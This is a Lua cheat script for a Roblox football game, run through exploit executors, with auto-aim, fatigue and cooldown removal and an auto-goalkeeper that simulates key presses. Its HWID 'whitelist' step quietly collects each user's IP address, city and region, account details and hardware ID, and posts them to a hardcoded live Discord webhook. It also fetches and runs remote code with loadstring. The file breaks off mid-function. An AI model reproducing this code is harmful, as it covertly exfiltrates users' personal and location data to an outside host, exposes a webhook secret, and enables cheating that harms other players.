-- ========================================
-- SERVICES
-- ========================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
-- ========================================
-- === WHITELIST CONFIGURATION ===
-- ========================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1456760973825413284/4SowsAHTn7IhIZC7b5SL2e115ifoQXMY3k624uoZExti5hrp8yJrvKFpwGBSIAlTpPho"
local WHITELIST = {
    ["A6A3A223-9F8F-432D-B9CD-30F94B58C6C3"] = true,
    ["ED3BCC12-098C-45EB-B268-85D54DE3ECBC"] = true,
    ["7E16E9B2-6037-4385-AAAD-CA35F60AA029"] = true,
}

-- ========================================
-- === HWID GENERATION ===
-- ========================================
local function getHWID()
    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
    return hwid
end

-- ========================================
-- === HTTP REQUEST WRAPPER ===
-- ========================================
local function doRequest(opts)
    if syn and syn.request then
        return syn.request(opts)
    elseif http_request then
        return http_request(opts)
    elseif request then
        return request(opts)
    else
        error("No HTTP request function found (syn.request / http_request / request).")
    end
end

-- ========================================
-- === WHITELIST VERIFICATION SYSTEM ===
-- ========================================
local function sendHWIDToWebhook(hwid, username, userId)
    local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
    
    if not request then
        warn("No HTTP request function available")
        return false
    end
    
    local executorType = "Unknown Executor" 
    if identifyexecutor then
        executorType = identifyexecutor()
    elseif syn and syn.request then
        executorType = "Synapse X"
    elseif KRNL_LOADED then
        executorType = "Krnl"
    elseif isFluxusExecutor then
        executorType = "Fluxus"
    elseif secure_load then
        executorType = "ScriptWare"
    end
    
    local playerProfileUrl = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
    
    local success, getIPResponse = pcall(function()
        return request({
            Url = "https://api.ipify.org/?format=json",
            Method = "GET"
        })
    end)
    
    local ipAddress = "N/A"
    local ipCountry = "N/A"
    local ipCountryCode = "N/A"
    local ipRegion = "N/A"
    local ipRegionName = "N/A"
    local ipCity = "N/A"
    
    if success and getIPResponse then
        local GetIPJSON = HttpService:JSONDecode(getIPResponse.Body)
        ipAddress = tostring(GetIPJSON.ip)
        
        local ipSuccess, getIPInfo = pcall(function()
            return request({
                Url = string.format("http://ip-api.com/json/%s", ipAddress),
                Method = "GET"
            })
        end)
        
        if ipSuccess and getIPInfo then
            local ipData = HttpService:JSONDecode(getIPInfo.Body)
            local function safeGet(field)
                return ipData[field] or "N/A"
            end
            
            ipCountry = safeGet("country")
            ipCountryCode = safeGet("countryCode")
            ipRegion = safeGet("region")
            ipRegionName = safeGet("regionName")
            ipCity = safeGet("city")
        end
    end
    
    local playerProfilePic = ""
    local avatarSuccess, avatarUrlRequest = pcall(function()
        return request({
            Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=150x150&format=Png&isCircular=false",
            Method = "GET"
        })
    end)
    
    if avatarSuccess and avatarUrlRequest then
        local avatarData = HttpService:JSONDecode(avatarUrlRequest.Body)
        playerProfilePic = avatarData.data and avatarData.data[1] and avatarData.data[1].imageUrl or ""
    end
    
    local playerMembershipType = Players.LocalPlayer.MembershipType and Players.LocalPlayer.MembershipType.Name or "N/A"
    local playerAccountAgeDays = math.floor(Players.LocalPlayer.AccountAge)
    
    local executionTimeUTC = os.date("!%Y-%m-%d %H:%M:%S UTC")
    local executionTimeLocal = os.date("%Y-%m-%d %H:%M:%S")
    
    local embedDescription = string.format([[
**Player Information**

- Username: [%s](%s)
- UserID: %d
- Membership Type: %s
- Account Age (days): %d

**HWID**
```
%s
```

**IP Information**

- IP Address: %s
- Country: %s (%s)
- Region: %s (%s)
- City: %s

**Execution Info**

- Executed At (UTC): %s
- Executed At (Local): %s
- Executor Type: %s
]],
        username, playerProfileUrl,
        userId,
        playerMembershipType,
        playerAccountAgeDays,
        hwid,
        ipAddress,
        ipCountry, ipCountryCode,
        ipRegion, ipRegionName,
        ipCity,
        executionTimeUTC,
        executionTimeLocal,
        executorType
    )
    
    local embed = {
        title = "üîê Script Access Request",
        description = embedDescription,
        color = 3447003,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        author = {
            name = "Whitelist System",
            url = playerProfileUrl
        },
        image = {
            url = playerProfilePic
        },
        footer = {
            text = "Copy the HWID above and add it to the whitelist table"
        }
    }
    
    local webhookData = {
        username = "Script Logger",
        embeds = { embed }
    }
    
    local postSuccess, postResponse = pcall(function()
        return request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(webhookData)
        })
    end)
    
    if not postSuccess then
        warn("Failed to send webhook: " .. tostring(postResponse))
        return false
    else
        print("Webhook sent successfully.")
        return true
    end
end

local function createNotWhitelistedUI(hwid)
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "WhitelistUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 450, 0, 300)
    frame.Position = UDim2.new(0.5, -225, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(255, 50, 50)
    frame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 0, 40)
    title.Position = UDim2.new(0, 10, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "üîí Access Denied"
    title.TextColor3 = Color3.fromRGB(255, 50, 50)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 20
    title.Parent = frame
    
    local infoLabel = Instance.new("TextLabel")
    infoLabel.Size = UDim2.new(1, -20, 0, 60)
    infoLabel.Position = UDim2.new(0, 10, 0, 55)
    infoLabel.BackgroundTransparency = 1
    infoLabel.Text = "Your HWID is not whitelisted.\nYour access request has been sent to the owner"
    infoLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    infoLabel.Font = Enum.Font.Gotham
    infoLabel.TextSize = 14
    infoLabel.TextWrapped = true
    infoLabel.Parent = frame
    
    local hwidLabel = Instance.new("TextLabel")
    hwidLabel.Size = UDim2.new(1, -40, 0, 30)
    hwidLabel.Position = UDim2.new(0, 20, 0, 120)
    hwidLabel.BackgroundTransparency = 1
    hwidLabel.Text = "Your HWID:"
    hwidLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
    hwidLabel.Font = Enum.Font.Gotham
    hwidLabel.TextSize = 12
    hwidLabel.TextXAlignment = Enum.TextXAlignment.Left
    hwidLabel.Parent = frame
    
    local hwidBox = Instance.new("TextBox")
    hwidBox.Size = UDim2.new(1, -40, 0, 50)
    hwidBox.Position = UDim2.new(0, 20, 0, 150)
    hwidBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    hwidBox.BorderSizePixel = 1
    hwidBox.BorderColor3 = Color3.fromRGB(60, 60, 60)
    hwidBox.Text = hwid
    hwidBox.TextColor3 = Color3.fromRGB(0, 255, 150)
    hwidBox.Font = Enum.Font.Code
    hwidBox.TextSize = 12
    hwidBox.TextWrapped = true
    hwidBox.TextEditable = false
    hwidBox.ClearTextOnFocus = false
    hwidBox.Parent = frame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -20, 0, 40)
    statusLabel.Position = UDim2.new(0, 10, 0, 210)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "‚úì Request sent! Contact owner for approval."
    statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 13
    statusLabel.TextWrapped = true
    statusLabel.Parent = frame
    
    local closeButton = Instance.new("TextButton")
    closeButton.Size = UDim2.new(0, 120, 0, 35)
    closeButton.Position = UDim2.new(0.5, -60, 0, 255)
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    closeButton.BorderSizePixel = 0
    closeButton.Text = "Close"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.Font = Enum.Font.GothamBold
    closeButton.TextSize = 14
    closeButton.Parent = frame
    
    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame
    
    local boxCorner = Instance.new("UICorner")
    boxCorner.CornerRadius = UDim.new(0, 4)
    boxCorner.Parent = hwidBox
    
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = closeButton
    
    return screenGui
end

local function createLoadingUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LoadingUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BorderSizePixel = 2
    frame.BorderColor3 = Color3.fromRGB(0, 200, 255)
    frame.Parent = screenGui
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 0, 40)
    title.Position = UDim2.new(0, 10, 0, 20)
    title.BackgroundTransparency = 1
    title.Text = "Verifying HWID..."
    title.TextColor3 = Color3.fromRGB(0, 200, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 18
    title.Parent = frame
    
    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(1, -20, 0, 40)
    statusLabel.Position = UDim2.new(0, 10, 0, 70)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Please wait..."
    statusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.TextSize = 14
    statusLabel.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = frame
    
    return screenGui, statusLabel
end

local function verifyHWID()
    local loadingGui, statusLabel = createLoadingUI()
    task.wait(0.5)
    
    local hwid = getHWID()
    statusLabel.Text = "Checking whitelist..."
    task.wait(0.3)
    
    local isWhitelisted = WHITELIST[hwid] == true
    
    statusLabel.Text = "Sending execution log..."
    local webhookSuccess = sendHWIDToWebhook(hwid, Players.LocalPlayer.Name, Players.LocalPlayer.UserId)
    
    if not webhookSuccess then
        warn("Webhook failed")
    end
    
    if isWhitelisted then
        statusLabel.Text = "‚úì Access Granted!"
        statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
        task.wait(1)
        loadingGui:Destroy()
        return true
    else
        loadingGui:Destroy()
        createNotWhitelistedUI(hwid)
        return false
    end
end

-- Run HWID verification
if not verifyHWID() then
    return
end
local player = Players.LocalPlayer



-- ========================================
-- LIBRARY SETUP
-- ========================================
local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'

local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()

local Window = Library:CreateWindow({
    Title = 'Blue Lock Script',
    Center = true,
    AutoShow = true,
    TabPadding = 8,
    MenuFadeTime = 0.2
})

-- ========================================
-- TABS
-- ========================================
local Tabs = {
    Main = Window:AddTab('Main'),
    AutoGK = Window:AddTab('Auto GK'),
    ['UI Settings'] = Window:AddTab('UI Settings'),
}

-- ========================================
-- FEATURE VARIABLES
-- ========================================
local AutoFlick = {
    enabled = false,
    flickupper = 0.95,
    flickpower = 0,
    directionbuff = 3,
}

local AutoEmperor = {
    enabled = false,
}

local AutoDestruction = {
    enabled = false,
    goalDistance = "Close Goal",
}

local AutoForm = {
    enabled = false,
    strongAutoFormEnabled = false,
    strongAutoFormHeight = 5,
}

local NoJumpFatigue = {
    enabled = false,
}

local NoJumpCooldown = {
    enabled = false,
}

local AutoGK = {
    enabled = false,
    instantMode = false,
    holdMode = true,
    diveOffset = 0.55,
    middleTolerance = 4.7,
    jumpHeightThreshold = 4.8,
    gravity = workspace.Gravity or 196.2,
    timeStep = 0.004,
    GROUND_Y = 0.5,
    BOUNCE_COEFFICIENT = 0.3,
    FRICTION_COEFFICIENT = 0.85,
    MIN_BOUNCE_VELOCITY = 3,
    ENABLE_BOUNCE_SIMULATION = true,
    leftGoalCFrame = CFrame.new(369.352325, 6.99591351, 0.340681076) * CFrame.Angles(0, math.rad(90), 0),
    leftGoalSize = Vector3.new(40.875736236572266, 16.916915893554688, 20.223739624023438),
    rightGoalCFrame = CFrame.new(-369.789307, 6.99591255, 0.313301444) * CFrame.Angles(0, math.rad(-90), 0),
    rightGoalSize = Vector3.new(40.875736236572266, 16.916915893554688, 20.223739624023438),
    activePlan = nil,
}

-- ========================================
-- MAIN TAB - AUTO FLICK
-- ========================================
local FlickTabBox = Tabs.Main:AddLeftTabbox()
local FlickTab = FlickTabBox:AddTab('Auto Flick')

FlickTab:AddToggle('AutoFlick', {
    Text = 'Enable Auto Flick',
    Default = false,
    Tooltip = 'Automatically execute flick shots'
})

FlickTab:AddSlider('FHeight', {
    Text = 'Flick Height',
    Default = 0.95,
    Min = 0,
    Max = 8,
    Rounding = 2,
    Compact = false,
})

FlickTab:AddSlider('FPower', {
    Text = 'Flick Power',
    Default = 0,
    Min = -4,
    Max = 8,
    Rounding = 3,
    Compact = false,
})

FlickTab:AddSlider('FDirectionBuff', {
    Text = 'Direction Buff',
    Default = 3,
    Min = -4,
    Max = 20,
    Rounding = 2,
    Compact = false,
})

FlickTab:AddDropdown('FlickConfig', {
    Values = { "5'3 - 5'5", "5'8 - 5'11", "6'0 - 6'3" },
    Default = 1,
    Multi = false,
    Text = 'Flick Preset',
    Tooltip = 'Select preset based on player height'
})

FlickTab:AddLabel('Keybind'):AddKeyPicker('FlickKeybind', {
    Default = 'Z',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Flick Execute',
    NoUI = false,
})

-- ========================================
-- MAIN TAB - EMPEROR & DESTRUCTION
-- ========================================
local AbilityTabBox = Tabs.Main:AddLeftTabbox()
local EmpTab = AbilityTabBox:AddTab('Auto Emperor')
local DestTab = AbilityTabBox:AddTab('Auto Destruction')

EmpTab:AddToggle('AutoEmp', {
    Text = 'Enable Auto Emperor',
    Default = false,
    Tooltip = 'Auto-aim for Emperor ability'
})

DestTab:AddToggle('AutoDest', {
    Text = 'Enable Auto Destruction',
    Default = false,
    Tooltip = 'Auto-aim for Destruction ability'
})

DestTab:AddDropdown('GoalDistanceSettings', {
    Values = { 'Close Goal', 'Far Goal' },
    Default = 1,
    Multi = false,
    Text = 'Goal Target',
    Tooltip = 'Select which goal to target'
})

-- ========================================
-- MAIN TAB - AUTO FORM & FATIGUE
-- ========================================
local MovementTabBox = Tabs.Main:AddRightTabbox()
local FormTab = MovementTabBox:AddTab('Auto Form')
local FatigueTab = MovementTabBox:AddTab('Fatigue & Cooldown')

FormTab:AddToggle('AutoForm', {
    Text = 'Enable Auto Form',
    Default = false,
    Tooltip = 'Automatically manage form'
})

FormTab:AddToggle('StrongAutoFormToggle', {
    Text = 'Strong Auto Form',
    Default = false,
    Tooltip = 'Enhanced auto form mode'
})

FormTab:AddSlider('StrongAutoFormHeight', {
    Text = 'Form Height Offset',
    Default = 5,
    Min = 1,
    Max = 15,
    Rounding = 1,
})

FatigueTab:AddToggle('NoJumpFatigue', {
    Text = 'No Jump Fatigue',
    Default = false,
    Tooltip = 'Remove jump fatigue debuff'
})

FatigueTab:AddToggle('NoJumpCooldown', {
    Text = 'No Jump Cooldown',
    Default = false,
    Tooltip = 'Remove jump cooldown'
})

-- ========================================
-- MAIN TAB - STAMINA
-- ========================================
local StaminaGroup = Tabs.Main:AddRightGroupbox('Stamina Control')

StaminaGroup:AddSlider('MaxStam', {
    Text = 'Maximum Stamina',
    Default = 100,
    Min = 100,
    Max = 7000,
    Rounding = 0,
    Compact = false,
})

StaminaGroup:AddButton({
    Text = 'Set Stamina Full',
    Func = function()
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")

        local accessory = Instance.new("Accessory")
        accessory.Name = "FullStamina"

        local handle = Instance.new("Part")
        handle.Name = "Handle"
        handle.Size = Vector3.new(1,1,1)
        handle.Color = Color3.fromRGB(0,255,0)
        handle.Anchored = false
        handle.CanCollide = false
        handle.Parent = accessory

        local attachment = Instance.new("Attachment")
        attachment.Name = "HatAttachment"
        attachment.Parent = handle

        accessory.Parent = character
        humanoid:AddAccessory(accessory)
        
        print('Stamina set to full!')
    end,
    DoubleClick = false,
    Tooltip = 'Instantly fill stamina bar'
})

-- ========================================
-- AUTO GK TAB
-- ========================================
local GKLeftBox = Tabs.AutoGK:AddLeftGroupbox('Settings')

GKLeftBox:AddSlider('GK_DiveOffset', {
    Text = 'Dive Offset',
    Default = 0.55,
    Min = 0,
    Max = 1,
    Rounding = 2,
    Compact = false,
    Suffix = 's',
})

GKLeftBox:AddSlider('GK_MiddleTolerance', {
    Text = 'Middle Tolerance',
    Default = 4.7,
    Min = 0.1,
    Max = 20,
    Rounding = 1,
    Compact = false,
})

GKLeftBox:AddLabel('Jump Height: 4.8 (FIXED)')

local GKControlsBox = Tabs.AutoGK:AddLeftGroupbox('Controls')

GKControlsBox:AddToggle('GK_Autodive', {
    Text = 'Enable Autodive',
    Default = false,
    Tooltip = 'Automatically dive to save shots'
})

GKControlsBox:AddToggle('GK_ModeToggle', {
    Text = 'Toggle Mode',
    Default = false,
    Tooltip = 'OFF = Hold Mode, ON = Toggle Mode'
})

local GKStatusBox = Tabs.AutoGK:AddRightGroupbox('Status')

local predictionLabel = GKStatusBox:AddLabel('Prediction: --')
local statusLabel = GKStatusBox:AddLabel('Status: Waiting...')
local timingLabel = GKStatusBox:AddLabel('Timing: --')
local modeLabel = GKStatusBox:AddLabel('Mode: HOLD (Press P)')

local GKKeybindsBox = Tabs.AutoGK:AddRightGroupbox('Keybinds')

GKKeybindsBox:AddLabel('Autodive Key'):AddKeyPicker('GK_AutodiveKey', {
    Default = 'U',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Autodive',
    NoUI = false,
})

GKKeybindsBox:AddLabel('Instant Mode Key'):AddKeyPicker('GK_InstantKey', {
    Default = 'T',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Instant',
    NoUI = false,
})

GKKeybindsBox:AddLabel('Toggle Mode Key'):AddKeyPicker('GK_ToggleModeKey', {
    Default = 'P',
    SyncToggleState = false,
    Mode = 'Toggle',
    Text = 'Toggle Mode',
    NoUI = false,
})

-- ========================================
-- FEATURE IMPLEMENTATIONS
-- ========================================

-- Auto Flick Setup
local function setupAutoFlick()
    local character = player.Character or player.CharacterAdded:Wait()
    local hrp = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")
    
    local animator = humanoid:FindFirstChildOfClass("Animator")
    if not animator then
        animator = Instance.new("Animator")
        animator.Parent = humanoid
    end
    
    local kickAnim = ReplicatedStorage.Anims:WaitForChild("M2Kick")
    
    return function()
        local lookDir = hrp.CFrame.LookVector
        local dirOffset = Vector3.new(0, AutoFlick.flickupper, 0)
        local forwardBoost = lookDir * AutoFlick.directionbuff
        dirOffset += Vector3.new(forwardBoost.X, 0, forwardBoost.Z)
        local direction = (lookDir + dirOffset).Unit

        local args = {
            [1] = {
                ["Riptide"] = "Straight",
                ["HitDirection"] = direction,
                ["Power"] = AutoFlick.flickpower,
                ["Genius"] = false,
                ["MindsEye"] = "Ati",
                ["Ambidextrous"] = false,
                ["Shiftlock"] = false
            },
            [2] = false
        }

        character.CharacterHandler.Remotes.RightClick:FireServer(unpack(args))
        local track = animator:LoadAnimation(kickAnim)
        track:Play()
    end
end

local executeFlick = setupAutoFlick()

-- Helper function for finding targets
local function findClosestTarget()
    local character = player.Character
    if not character then return nil end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end

    local targets = {}
    local aiFolders = {"AIGKRED", "AIGKWHITE"}

    for _, folderName in ipairs(aiFolders) do
        local folder = Workspace:FindFirstChild(folderName)
        if folder then
            local targetPart = folder:FindFirstChild("Torso") or folder:FindFirstChild("HumanoidRootPart")
            if targetPart then table.insert(targets, targetPart) end
        end
    end

    local goalDetectorFolder = Workspace:FindFirstChild("GoalDetector")
    if goalDetectorFolder then
        for _, goal in ipairs(goalDetectorFolder:GetChildren()) do
            if goal:IsA("BasePart") then table.insert(targets, goal) end
        end
    end

    local closest, shortest = nil, math.huge
    for _, t in ipairs(targets) do
        local d = (t.Position - hrp.Position).Magnitude
        if d < shortest then
            shortest = d
            closest = t
        end
    end
    return closest
end

local function findFarthestTarget()
    local character = player.Character
    if not character then return nil end
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end

    local targets = {}
    local aiFolders = {"AIGKRED", "AIGKWHITE"}

    for _, folderName in ipairs(aiFolders) do
        local folder = Workspace:FindFirstChild(folderName)
        if folder then
            local targetPart = folder:FindFirstChild("Torso") or folder:FindFirstChild("HumanoidRootPart")
            if targetPart then table.insert(targets, targetPart) end
        end
    end

    local goalDetectorFolder = Workspace:FindFirstChild("GoalDetector")
    if goalDetectorFolder then
        for _, goal in ipairs(goalDetectorFolder:GetChildren()) do
            if goal:IsA("BasePart") then table.insert(targets, goal) end
        end
    end

    local farthest, longest = nil, 0
    for _, t in ipairs(targets) do
        local d = (t.Position - hrp.Position).Magnitude
        if d > longest then
            longest = d
            farthest = t
        end
    end
    return farthest
end

-- Auto Emperor Implementation
local camera = workspace.CurrentCamera
local rightClickHeld = false

UserInputService.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rightClickHeld = true
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton2 then
        rightClickHeld = false
    end
end)

RunService.RenderStepped:Connect(function()
    if not AutoEmperor.enabled then return end
    if not rightClickHeld then return end
    
    local char = player.Character
    if not char then return end
    
    local activationW = char:FindFirstChild("ActivationW")
    local weaponAttr = player:GetAttribute("Weapon")
    
    if weaponAttr == "Emperor" and activationW then
        local target = findClosestTarget()
        if target then
            local camPos = camera.CFrame.Position
            local distance = (target.Position - camPos).Magnitude
            local yOffset = math.clamp(distance / 6, 2, 6)
            local targetPos = target.Position + Vector3.new(2, 0, 2)
            camera.CFrame = CFrame.lookAt(camPos, targetPos + Vector3.new(0, yOffset, 0))
        end
    end
end)

-- Auto Destruction Implementation
local function isDestOpened()
    local character = player.Character
    if not character then return false end
    
    local activationT = character:FindFirstChild("ActivationT")
    if not activationT then return false end

    local metavisionText = player.PlayerGui.Main.DribblingStyle.MetavisionStyleText
    if metavisionText and metavisionText.Text == "Genius Style: Destruction" then
        return true
    end
    return false
end

local function getRiptideStatus()
    local playerGui = player:WaitForChild("PlayerGui")
    local mainGui = playerGui:WaitForChild("Main", 5)
    if not mainGui then return nil end

    local curve = mainGui:FindFirstChild("Curve")
    if not curve then return nil end

    local left = curve:FindFirstChild("Left")
    local right = curve:FindFirstChild("Right")
    if not left or not right then return nil end

    if left.Visible then return "Left"
    elseif right.Visible then return "Right" end
    return nil
end

local function rotatePlayerToTarget(target)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp or not target then return end
    
    local targetPos = target.Position + Vector3.new(2, 0, 2)
    local targetCFrame = CFrame.lookAt(hrp.Position, targetPos)
    
    local curveStatus = getRiptideStatus()
    if curveStatus == "Right" then
        targetCFrame = targetCFrame * CFrame.Angles(0, math.rad(90), 0)
    elseif curveStatus == "Left" then
        targetCFrame = targetCFrame * CFrame.Angles(0, math.rad(-90), 0)
    end
    
    hrp.CFrame = targetCFrame
end

local function checkRiptideStatus()
    local curve = player.PlayerGui.Main.Curve
    return curve.Left.Visible or curve.Right.Visible
end

RunService.RenderStepped:Connect(function()
    if not AutoDestruction.enabled then return end
    if not rightClickHeld then return end
    if not checkRiptideStatus() then return end
    if not isDestOpened() then return end
    
    local target
    if AutoDestruction.goalDistance == "Far Goal" then
        target = findFarthestTarget()
    else
        target = findClosestTarget()
    end
    
    if target then
        local camPos = camera.CFrame.Position
        local distance = (target.Position - camPos).Magnitude
        local yOffset
        
        if AutoDestruction.goalDistance == "Far Goal" then
            yOffset = math.clamp(distance / 5, 150, 600)
            yOffset = yOffset + 300 + 70
        else
            yOffset = math.clamp(distance / 7, 50, 200)
            yOffset = yOffset - 20
        end
        
        local targetPos = target.Position + Vector3.new(2, 0, 2)
        camera.CFrame = CFrame.lookAt(camPos, targetPos + Vector3.new(0, yOffset, 0))
        rotatePlayerToTarget(target)
    end
end)

-- No Jump Fatigue & Cooldown
task.spawn(function()
    while true do
        task.wait(0.1)
        if not (NoJumpFatigue.enabled or NoJumpCooldown.enabled) then
            continue
        end
        local char = player.Character
        if not char then continue end
        
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then continue end
        
        if NoJumpFatigue.enabled then
            local jf = char:FindFirstChild("JumpFatigue")
            if jf then jf:Destroy() end
        end
        
        if NoJumpCooldown.enabled then
            hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
            if hum:GetState() == Enum.HumanoidStateType.Landed then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
            if hum.Jump then
                hum.Jump = false
            end
        end
    end
end)

-- Auto GK Implementation
AutoGK.leftGoalFrontCFrame = AutoGK.leftGoalCFrame + (AutoGK.leftGoalCFrame.LookVector * (AutoGK.leftGoalSize.Z / 2))
AutoGK.rightGoalFrontCFrame = AutoGK.rightGoalCFrame + (AutoGK.rightGoalCFrame.LookVector * (AutoGK.rightGoalSize.Z / 2))

local ballsFolder
repeat
    ballsFolder = Workspace:FindFirstChild("Balls")
    RunService.RenderStepped:Wait()
until ballsFolder

local function checkLineIntersectsGoal(pos1, pos2, goalCFrame, goalSize)
    local p1 = goalCFrame:PointToObjectSpace(pos1)
    local p2 = goalCFrame:PointToObjectSpace(pos2)

    if (p1.Z > 0 and p2.Z < 0) or (p1.Z < 0 and p2.Z > 0) then
        local t = p1.Z / (p1.Z - p2.Z)
        local ix = p1.X + t * (p2.X - p1.X)
        local iy = p1.Y + t * (p2.Y - p1.Y)
        if math.abs(ix) <= goalSize.X/2 and math.abs(iy) <= goalSize.Y/2 then
            return true, Vector3.new(ix, iy, 0)
        end
    end
    return false, nil
end

local function predictGoalHit(ballPos, ballVel)
    local currentPos, currentVel = ballPos, ballVel
    local currentTime = 0
    local prevPos = ballPos
    local maxTime = 2
    local bounceDetected = false

    local adaptiveTimeStep = AutoGK.timeStep
    if ballVel.Magnitude > 200 then
        adaptiveTimeStep = 0.0004
    end

    while currentTime < maxTime do
        currentTime = currentTime + adaptiveTimeStep

        local accel = Vector3.new(0, -AutoGK.gravity, 0)
        local nextVel = currentVel + accel * adaptiveTimeStep
        local avgVel = (currentVel + nextVel) * 0.5
        local nextPos = currentPos + avgVel * adaptiveTimeStep

        if AutoGK.ENABLE_BOUNCE_SIMULATION and nextPos.Y <= AutoGK.GROUND_Y and currentVel.Y < 0 then
            bounceDetected = true

            local a = -0.5 * AutoGK.gravity
            local b = currentVel.Y
            local c = currentPos.Y - AutoGK.GROUND_Y
            local disc = b*b - 4*a*c

            if disc >= 0 then
                local t = (-b - math.sqrt(disc)) / (2*a)
                t = math.clamp(t, 0, adaptiveTimeStep)

                local groundVel = currentVel + Vector3.new(0, -AutoGK.gravity*t, 0)
                local groundPos = currentPos + currentVel*t + Vector3.new(0, -0.5*AutoGK.gravity*t*t, 0)
                groundPos = Vector3.new(groundPos.X, AutoGK.GROUND_Y, groundPos.Z)

                nextVel = Vector3.new(
                    groundVel.X * AutoGK.FRICTION_COEFFICIENT,
                    -groundVel.Y * AutoGK.BOUNCE_COEFFICIENT,
                    groundVel.Z * AutoGK.FRICTION_COEFFICIENT
                )
                nextPos = groundPos

                if math.abs(nextVel.Y) < AutoGK.MIN_BOUNCE_VELOCITY then
                    break
                end
            end
        end

        if nextPos.Y < -20 then break end

        local hitL, localHitL = checkLineIntersectsGoal(prevPos, nextPos, AutoGK.leftGoalFrontCFrame, AutoGK.leftGoalSize)
        if hitL then
            return currentTime, AutoGK.leftGoalFrontCFrame:PointToWorldSpace(localHitL), "LEFT",
                bounceDetected, AutoGK.leftGoalFrontCFrame, localHitL
        end

        local hitR, localHitR = checkLineIntersectsGoal(prevPos, nextPos, AutoGK.rightGoalFrontCFrame, AutoGK.rightGoalSize)
        if hitR then
            return currentTime, AutoGK.rightGoalFrontCFrame:PointToWorldSpace(localHitR), "RIGHT",
                bounceDetected, AutoGK.rightGoalFrontCFrame, localHitR
        end

        prevPos = currentPos
        currentPos = nextPos
        currentVel = nextVel
    end

    return nil, nil, nil, false, nil, nil
end

local function sendKey(key)
    pcall(function()
        VirtualInputManager:SendKeyEvent(true, key, false, game)
        RunService.RenderStepped:Wait()
        VirtualInputManager:SendKeyEvent(false, key, false, game)
    end)
end

local function pressKeyOnce(name)
    local key = Enum.KeyCode[name] or name
    sendKey(key)
end

local function getKeeperRoot()
    local char = player.Character
    if not char then return nil end
    return char:FindFirstChild("HumanoidRootPart") or
           char:FindFirstChild("Torso") or
           char:FindFirstChild("UpperTorso")
end

local function chooseDive(goalFrontCFrame, localHitPos, keeperPos)
    local keeperLocal = goalFrontCFrame:PointToObjectSpace(keeperPos)
    local dx = localHitPos.X - keeperLocal.X

    if math.abs(dx) <= AutoGK.middleTolerance then
        return "MIDDLE"
    end
